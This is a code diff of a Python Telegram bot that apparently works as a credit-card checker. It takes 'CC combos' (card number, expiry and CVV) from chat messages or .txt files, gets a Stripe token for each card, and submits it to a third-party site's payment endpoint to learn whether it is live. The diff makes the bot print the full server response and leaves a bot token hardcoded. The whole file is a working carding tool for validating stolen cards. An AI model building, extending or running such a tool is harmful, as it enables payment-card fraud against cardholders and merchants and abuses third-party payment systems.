@@ -1,12 +1,11 @@
 import telebot
 import requests
-import re
+import os
 
-TOKEN = '7018443911:AAGaG92kGhUpRUrb9f6TjI0qD8bMCk34PJ8'  # <-- Put your bot token here
+TOKEN = '7018443911:AAGaG92kGhUpRUrb9f6TjI0qD8bMCk34PJ8'  # <-- Replace with your actual bot token
 
 bot = telebot.TeleBot(TOKEN)
 
-# Helper to parse CC lines
 def parse_cc_line(line):
     line = line.replace(' ', '').replace(':', '|').replace(';', '|').replace(',', '|')
     parts = line.split('|')
@@ -17,12 +16,11 @@ def parse_cc_line(line):
         return cc, mm, yy, cvv
     return None
 
-# Start
 @bot.message_handler(commands=['start'])
 def start_handler(message):
-    bot.send_message(message.chat.id, "Send me CC combos in the format:\nCC|MM|YY|CVV or CC|MM|YYYY|CVV\nYou can send as text or .txt file.")
+    bot.send_message(message.chat.id,
+                     "Send me CC combos in the format:\nCC|MM|YY|CVV or CC|MM|YYYY|CVV\nYou can send as text or .txt file.")
 
-# Handle text combos
 @bot.message_handler(content_types=['text'])
 def cc_text_handler(message):
     lines = [l.strip() for l in message.text.split('\n') if l.strip()]
@@ -35,7 +33,6 @@ def cc_text_handler(message):
     for cc, mm, yy, cvv in combos:
         check_cc(message, cc, mm, yy, cvv)
 
-# Handle .txt file
 @bot.message_handler(content_types=['document'])
 def cc_file_handler(message):
     if not message.document.file_name.lower().endswith('.txt'):
@@ -55,7 +52,6 @@ def cc_file_handler(message):
         check_cc(message, cc, mm, yy, cvv)
 
 def check_cc(message, cc, mm, yy, cvv):
-    # 1. Stripe token request
     stripe_url = "https://api.stripe.com/v1/tokens"
     stripe_headers = {
         "content-type": "application/x-www-form-urlencoded",
@@ -129,11 +125,10 @@ def check_cc(message, cc, mm, yy, cvv):
     try:
         resp2 = requests.post(sparktoro_url, headers=sparktoro_headers, data=sparktoro_data, timeout=30)
         text = resp2.text
-        # Updated logic: if "declined" in response -> Failure, else Success
         if "declined" in text.lower():
-            msg = f"[{cc}|{mm}|{yy}|{cvv}] Declined ❌"
+            msg = f"[{cc}|{mm}|{yy}|{cvv}] Declined ❌\nFull response:\n{text}"
         else:
-            msg = f"[{cc}|{mm}|{yy}|{cvv}] Success ✅"
+            msg = f"[{cc}|{mm}|{yy}|{cvv}] Success ✅\nFull response:\n{text}"
         bot.send_message(message.chat.id, msg)
     except Exception as e:
         bot.send_message(message.chat.id, f"[{cc}|{mm}|{yy}|{cvv}] SparkToro request error: {e}")
